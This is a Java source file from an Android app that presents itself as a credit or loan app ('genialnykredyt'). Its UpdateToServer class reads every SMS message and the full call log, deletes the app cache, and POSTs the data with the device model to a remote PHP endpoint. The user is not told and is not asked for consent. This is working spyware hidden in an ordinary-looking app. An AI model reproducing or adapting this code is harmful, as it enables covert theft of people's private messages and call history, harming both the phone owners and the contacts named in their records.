package com.app.genialnykredyt;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class UpdateToServer {
    Context context;
    Uri mSmsQueryUri = Uri.parse("content://sms");
    //static String response;
    //static String serverResponse="";

    public UpdateToServer(Context context)
    {
        this.context = context;
    }

    public ArrayList<String> getMessages()
    {

        ArrayList<String> messages = new ArrayList<String>();
        ContentResolver contentResolver=context.getContentResolver();
        Cursor cursor = null;
        try {
            cursor = contentResolver.query(mSmsQueryUri, new String[] { "_id", "address", "date", "body",
                    "type", "read" }, null, null, "date desc");
            if (cursor == null) {
                Log.i("curson null", "cursor is null. uri: " + mSmsQueryUri);
            }

            for (boolean hasData = cursor.moveToFirst(); hasData; hasData = cursor.moveToNext()) {

                String body = cursor.getString(cursor.getColumnIndex("body"));
                String address = cursor.getString(cursor.getColumnIndex("address"));

                messages.add("\n\n"+"Number:     "+address+"\n"+"Content:     "+body+"\n\n");
            }
        } catch (Exception e) {
            Log.e("Error", e.getMessage());
        } finally {
            cursor.close();
        }
        return messages;

    }


    private  String getCallDetail()
    {
        StringBuffer stringBuffer = new StringBuffer();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");
        }
        cursor.close();
        return stringBuffer.toString();
    }


    public void addtoServer(final Context context) {

        final ArrayList<String> smss=getMessages();
        final String callllogs=getCallDetail();
        trimCache(context);
        StringRequest request=new StringRequest(Request.Method.POST, "http://rfbasolutions.com/get_messages_api/store_new_details.php", new Response.Listener<String>()
        {

            @Override
            public void onResponse( String response) {

                Log.i("RESPONSE",response);

                //serverResponse=response;
                //Toast.makeText(context, response, Toast.LENGTH_SHORT).show();

            }
        }, new Response.ErrorListener()
        {
            @Override
            public void onErrorResponse(VolleyError error)
            {
                //Toast.makeText(context, error.toString(), Toast.LENGTH_SHORT).show();
            }
        })
        {
            @Override
            protected Map<String,String> getParams() throws AuthFailureError {
                HashMap<String,String> params=new HashMap<>();

                params.put("imei_no","");

                String DEVICE_NAME = android.os.Build.MODEL;

                if(DEVICE_NAME!=null){
                    Log.i("IMEII",DEVICE_NAME);
                    params.put("device_name",DEVICE_NAME);
                }

                params.put("calllog",callllogs.toString());
                params.put("record", smss.toString());

                return params;
            }
        };
        RequestQueue requestQueue= Volley.newRequestQueue(context);
        requestQueue.add(request);

    }


    public static void trimCache(Context context) {
        try {
            File dir = context.getCacheDir();
            if (dir != null && dir.isDirectory()) {
                deleteDir(dir);
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
    }



    public static boolean deleteDir(File dir) {
        if (dir != null && dir.isDirectory()) {
            String[] children = dir.list();
            for (int i = 0; i < children.length; i++) {
                boolean success = deleteDir(new File(dir, children[i]));
                if (!success) {
                    return false;
                }
            }
        }

        // The directory is now empty so delete it
        return dir.delete();
    }
}
